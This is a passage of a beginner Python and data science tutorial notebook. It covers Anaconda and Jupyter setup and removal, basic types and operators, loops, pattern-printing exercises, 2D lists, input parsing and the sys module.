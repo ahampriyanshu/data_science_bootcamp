{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e7ca9ca2",
   "metadata": {},
   "source": [
    "## Installing Anaconda\n",
    "\n",
    "1. Download [Anaconda installer](https://www.anaconda.com/download/#linux)\n",
    "1. Run ``bash ~/Downloads/Anaconda3-2020.02-Linux-x86_64.sh``\n",
    "1. Follow the prompts on the installer screens\n",
    "1. Restart the terminal \n",
    "1. Verify the installation by running ``conda info``"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1af38bd7",
   "metadata": {},
   "source": [
    "## Anaconda Commands\n",
    "\n",
    "Description | Command\n",
    ":--- |:---\n",
    "Creating new virtual env | conda create -n myenv pandas jupyterlab\n",
    "Cloning existing env | conda create -n myclone --clone myenv\n",
    "Version specified | conda create -n myenv python=3.8\n",
    "Activating the env | conda activate myenv\n",
    "Deactivating the env | conda deactivate\n",
    "Listing env | conda env list\n",
    "Removing env | conda env remove --name myenv\n",
    "Installing packages | conda install pandas"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "edeacae8",
   "metadata": {},
   "source": [
    "## Uninstalling Anaconda\n",
    "\n",
    "```\n",
    "conda install anaconda-clean\n",
    "anaconda-clean --yes\n",
    "sudo rm -rf ~/anaconda3\n",
    "sudo rm -rf ~/.anaconda_backup   \n",
    "sudo rm -rf ~/.condarc ~/.conda ~/.continuum\n",
    "```\n",
    "*  Remove the PATH from _~/.bashrc_ and _~/.bash_profile_"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2e8a4fd1",
   "metadata": {},
   "source": [
    "## Installing Jupyter Notebook\n",
    "* You can also install Jupyter individualy and manage the virtual enviroment with virtualenv\n",
    " \n",
    "```\n",
    "pip3 install Jupyter\n",
    "pip3 install virtualenv\n",
    "virtualenv my_project_env\n",
    "source my_project_env/bin/activate\n",
    "jupyter notebook\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fa838c6a",
   "metadata": {},
   "source": [
    "## Jupyter Notebook 500 : Internal Server Error\n",
    "\n",
    "* In this case upgrade your Jupyter hub\n",
    "\n",
    "```\n",
    "pip3 install --upgrade jupyterhub\n",
    "pip3 install --upgrade --user nbconve\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "11e5a965",
   "metadata": {},
   "source": [
    "## Jupyter shortcuts\n",
    "\n",
    "Description | Command\n",
    ":--- | :---\n",
    "A | Insert a new cell above\n",
    "B | Insert a new cell below\n",
    "M | Markdown\n",
    "Y | Code\n",
    "D+D | Delete the current cell\n",
    "Shift + Enter | Compile and move to the next cell \n",
    "Alt + Enter | Compile and insert a new cell\n",
    "Shift + Tab | Docstring\n",
    "Esc + F | Find and Replace\n",
    "Esc + O | Toggle cell output\n",
    "Shift + J | Selects cell in downwards direction\n",
    "Shift + K | Selects cell in upwards direction\n",
    "Shift + M | Merge cells"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "13b94edc",
   "metadata": {},
   "source": [
    "## Uninstalling Jupyter\n",
    "\n",
    "```\n",
    "pip3 uninstall jupyter jupyter_core jupyter-client jupyter-console jupyterlab_pygments notebook qtconsole nbconvert nbformat\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3ea8807c",
   "metadata": {},
   "source": [
    "## Types of variable in python"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "f5f3c2f8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "int"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = 10\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "4f65e60f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "str"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = 'name'\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "a034501e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "float"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = 3.14\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "b34714e6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "bool"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = True\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "ce4a9ec9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "list"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = []\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "f83a6b71",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tuple"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = ()\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "e39a2fad",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = {}\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "29186a8c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "complex"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = 2 + 3j\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "861b7114",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "139728365961744\n",
      "139728365961776\n"
     ]
    }
   ],
   "source": [
    "a = 10\n",
    "print(id(a))\n",
    "a = a + 1\n",
    "print(id(a))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "e1716e99",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "139728365961744\n",
      "139728365961744\n"
     ]
    }
   ],
   "source": [
    "b = 10\n",
    "c = 10\n",
    "print(id(b))\n",
    "print(id(c))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "2584a2c0",
   "metadata": {},
   "outputs": [],
   "source": [
    "a = 100\n",
    "b = 17"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "7e465304",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "117"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a+b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "c946f5bc",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "83"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a-b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "ccc548fe",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1700"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a*b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "c17a1993",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10000000000000000000000000000000000"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a**b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "32f8b111",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5.882352941176471"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a/b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "ad483ee8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a//b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "cc3aa40b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "15"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a % b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "aafdb564",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "41\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "str"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = input()\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "64a3cff4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "41\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "int"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = int(input())\n",
    "type(a)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2a35baed",
   "metadata": {},
   "source": [
    "## Comments "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a751759e",
   "metadata": {},
   "source": [
    "### Single line comments"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "3f6a1bc9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = 10\n",
    "# a = 20\n",
    "a"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c8c4a32f",
   "metadata": {},
   "source": [
    "### Multi line comments\n",
    "\n",
    "* Python doesn't support multi line comments. So, we can use multiple hashes."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "a24af90d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "b = 0\n",
    "# b = 10\n",
    "# b = 20\n",
    "# b = 30\n",
    "b"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "41169739",
   "metadata": {},
   "source": [
    "### Docstring"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "cce8f342",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "40"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def add(a, b):\n",
    "    \"\"\"\n",
    "    This function sums up\n",
    "    two integers\n",
    "    \"\"\"\n",
    "    return a + b\n",
    "\n",
    "\n",
    "add(10, 30)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "97fdf3cf",
   "metadata": {},
   "source": [
    "## Functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "8449b908",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "40"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def add(a, b): return a + b\n",
    "\n",
    "\n",
    "add(10, 30)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7ab0cfd7",
   "metadata": {},
   "source": [
    "## Conditional operator"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "e01cb33e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "20\n",
      "even\n"
     ]
    }
   ],
   "source": [
    "a = int(input())\n",
    "\n",
    "if a%2 == 0:\n",
    "    print('even')\n",
    "else:\n",
    "    print('odd')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c4e8fe6",
   "metadata": {},
   "source": [
    "## Loops"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "01177b52",
   "metadata": {},
   "source": [
    "### For Loop"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "4c476f1c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "the\n",
      "meaning\n",
      "of\n",
      "life\n"
     ]
    }
   ],
   "source": [
    "items = [\"the\", \"meaning\", \"of\", \"life\"]\n",
    "for item in items:\n",
    "  print(item)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "9d2698fe",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\n",
      "1\n",
      "2\n",
      "3\n",
      "4\n",
      "5\n",
      "6\n",
      "7\n",
      "8\n",
      "9\n"
     ]
    }
   ],
   "source": [
    "for i in range(10):\n",
    "    print(i)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5bc1bb37",
   "metadata": {},
   "source": [
    "### While Loop"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "0626c69f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\n",
      "1\n",
      "2\n",
      "3\n",
      "4\n",
      "5\n",
      "6\n",
      "7\n",
      "8\n",
      "9\n"
     ]
    }
   ],
   "source": [
    "i = 0\n",
    "while i < 10:\n",
    "  print(i)\n",
    "  i += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7feb2870",
   "metadata": {},
   "source": [
    "## Patterns"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5fffe09c",
   "metadata": {},
   "source": [
    "### Square"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "f78b348e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "1 1 1 1 1 \n",
      "2 2 2 2 2 \n",
      "3 3 3 3 3 \n",
      "4 4 4 4 4 \n",
      "5 5 5 5 5 \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n :\n",
    "    j = 1\n",
    "    while j <= n:\n",
    "        print(i, end = ' ')\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "ffec9a3b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "1 2 3 4 5 \n",
      "1 2 3 4 5 \n",
      "1 2 3 4 5 \n",
      "1 2 3 4 5 \n",
      "1 2 3 4 5 \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n :\n",
    "    j = 1\n",
    "    while j <= n:\n",
    "        print(j, end = ' ')\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "b92340fc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "5 4 3 2 1 \n",
      "5 4 3 2 1 \n",
      "5 4 3 2 1 \n",
      "5 4 3 2 1 \n",
      "5 4 3 2 1 \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n :\n",
    "    j = 1\n",
    "    while j <= n:\n",
    "        print(n-j+1, end = ' ')\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4ccd6923",
   "metadata": {},
   "source": [
    "### Triangle "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "208d4913",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "1 \n",
      "1 2 \n",
      "1 2 3 \n",
      "1 2 3 4 \n",
      "1 2 3 4 5 \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n :\n",
    "    j = 1\n",
    "    while j <= i :\n",
    "        print(j, end = ' ')\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "5ae95019",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "1 \n",
      "2 3 \n",
      "3 4 5 \n",
      "4 5 6 7 \n",
      "5 6 7 8 9 \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n :\n",
    "    j = i\n",
    "    k = 1\n",
    "    while k <= i :\n",
    "        print(j, end = ' ')\n",
    "        k = k + 1\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "3d1a8fa6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "1 \n",
      "2 3 \n",
      "4 5 6 \n",
      "7 8 9 10 \n",
      "11 12 13 14 15 \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "t = 1\n",
    "while i <= n :\n",
    "    j = 1\n",
    "    while j <= i :\n",
    "        print(t, end = ' ')\n",
    "        t = t + 1\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "047a8359",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "1 \n",
      "2 2 \n",
      "3 3 3 \n",
      "4 4 4 4 \n",
      "5 5 5 5 5 \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n:\n",
    "    j = 1\n",
    "    while j <= i:\n",
    "        print(i, end = ' ')\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "51a682ae",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "1 \n",
      "2 1 \n",
      "3 2 1 \n",
      "4 3 2 1 \n",
      "5 4 3 2 1 \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n:\n",
    "    j = i\n",
    "    while j > 0:\n",
    "        print(j, end = ' ')\n",
    "        j = j - 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8b5cb1c4",
   "metadata": {},
   "source": [
    "### Characters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "9f87011a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "A B C D E \n",
      "A B C D E \n",
      "A B C D E \n",
      "A B C D E \n",
      "A B C D E \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n :\n",
    "    j = 1\n",
    "    while j <= n:\n",
    "        print(chr(ord('A') + j -1), end = ' ')\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "a19f5c1a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "A B C D E \n",
      "B C D E F \n",
      "C D E F G \n",
      "D E F G H \n",
      "E F G H I \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n :\n",
    "    j = 1\n",
    "    start = chr(ord('A') + i -1)\n",
    "    while j <= n:\n",
    "        print(chr(ord(start) + j -1), end = ' ')\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3dc5caed",
   "metadata": {},
   "source": [
    "### Inverted"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "1673a1a6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "* * * * * \n",
      "* * * * \n",
      "* * * \n",
      "* * \n",
      "* \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n:\n",
    "    j = 1\n",
    "    while j <= n - i + 1:\n",
    "        print('*', end=' ')\n",
    "        j = j + 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c8f526b",
   "metadata": {},
   "source": [
    "### Reversed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "68c134a1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "        * \n",
      "      * * \n",
      "    * * * \n",
      "  * * * * \n",
      "* * * * * \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n:\n",
    "    j = n - i\n",
    "    star = i\n",
    "    while j > 0:\n",
    "        print(' ', end=' ')\n",
    "        j = j - 1\n",
    "    while star > 0:\n",
    "        print('*', end=' ')\n",
    "        star = star - 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "29b6afbc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "        * \n",
      "      * * * \n",
      "    * * * * * \n",
      "  * * * * * * * \n",
      "* * * * * * * * * \n"
     ]
    }
   ],
   "source": [
    "n = int(input())\n",
    "i = 1\n",
    "while i <= n:\n",
    "    j = n - i\n",
    "    star = i\n",
    "    while j > 0:\n",
    "        print(' ', end=' ')\n",
    "        j = j - 1\n",
    "    while star > 0:\n",
    "        print('*', end=' ')\n",
    "        star = star - 1\n",
    "    p = i - 1\n",
    "    while p >= 1:\n",
    "        print('*', end=' ')\n",
    "        p = p - 1\n",
    "    print()\n",
    "    i = i + 1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90022c90",
   "metadata": {},
   "source": [
    "# 2d List"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "7e16b555",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[[1, 2, 3], [4, 5, 6], [7, 8, 9]]"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "li = [[1,2,3],[4,5,6],[7,8,9]]\n",
    "li"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "196b94e8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 2, 3]"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "li[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "c1a5deba",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "li[0][0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "ad437121",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "li = [i for i in range(10)]\n",
    "li"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "dacdefac",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[[0, 1, 2, 3, 4, 5, 6, 7, 8, 9],\n",
       " [10, 11, 12, 13, 14, 15, 16, 17, 18, 19],\n",
       " [20, 21, 22, 23, 24, 25, 26, 27, 28, 29],\n",
       " [30, 31, 32, 33, 34, 35, 36, 37, 38, 39],\n",
       " [40, 41, 42, 43, 44, 45, 46, 47, 48, 49],\n",
       " [50, 51, 52, 53, 54, 55, 56, 57, 58, 59],\n",
       " [60, 61, 62, 63, 64, 65, 66, 67, 68, 69],\n",
       " [70, 71, 72, 73, 74, 75, 76, 77, 78, 79],\n",
       " [80, 81, 82, 83, 84, 85, 86, 87, 88, 89],\n",
       " [90, 91, 92, 93, 94, 95, 96, 97, 98, 99]]"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "li = [ [10*i + j for j in range(10) ] for i in range(10)]\n",
    "li"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "133568ab",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "     1 2 3 4 5      \n",
      "<class 'str'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'     1 2 3 4 5      '"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str = input()\n",
    "print(type(str))\n",
    "str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "1246b120",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "     1 2 3 4 5      \n",
      "<class 'str'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'1 2 3 4 5'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str = input().strip()\n",
    "print(type(str))\n",
    "str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "1a457eb6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "     1 2 3 4 5      \n",
      "<class 'list'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['1', '2', '3', '4', '5']"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str = input().split()\n",
    "print(type(str))\n",
    "str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "32a72a7a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "     1 2 3 4 5      \n",
      "<class 'list'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['', '', '', '', '', '1', '2', '3', '4', '5', '', '', '', '', '', '']"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str = input().split(\" \")\n",
    "print(type(str))\n",
    "str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "88ac60f5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "     1 2 3 4 5      \n",
      "<class 'list'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['1', '2', '3', '4', '5']"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str = input().strip().split(\" \")\n",
    "print(type(str))\n",
    "str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ea5b4e82",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2 3\n",
      "1 2 3 4 5 6\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[[1, 2, 3], [4, 5, 6]]"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str = input().strip().split(\" \")\n",
    "n = int(str[0])\n",
    "m = int(str[1])\n",
    "\n",
    "li = [int(i) for i in input().strip().split(\" \")]\n",
    "\n",
    "l2 = []\n",
    "for i in range(n):\n",
    "    l2.append([])\n",
    "    for j in range(m):\n",
    "        l2[i].append(li[i*m + j])\n",
    "l2"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "33dca436",
   "metadata": {},
   "source": [
    "## sys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "708362a7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'3.10.4 (main, Mar 23 2022, 23:05:40) [GCC 11.2.0]'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import sys\n",
    "\n",
    "sys.version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "d0f27c2a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/usr/bin/python'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sys.executable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "ef31fc1d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'linux'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sys.platform"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "262547a5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1234"
     ]
    }
   ],
   "source": [
    "for i in range(1,5):\n",
    "    sys.stdout.write(str(i))\n",
    "    sys.stdout.flush()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "4bfdd225",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
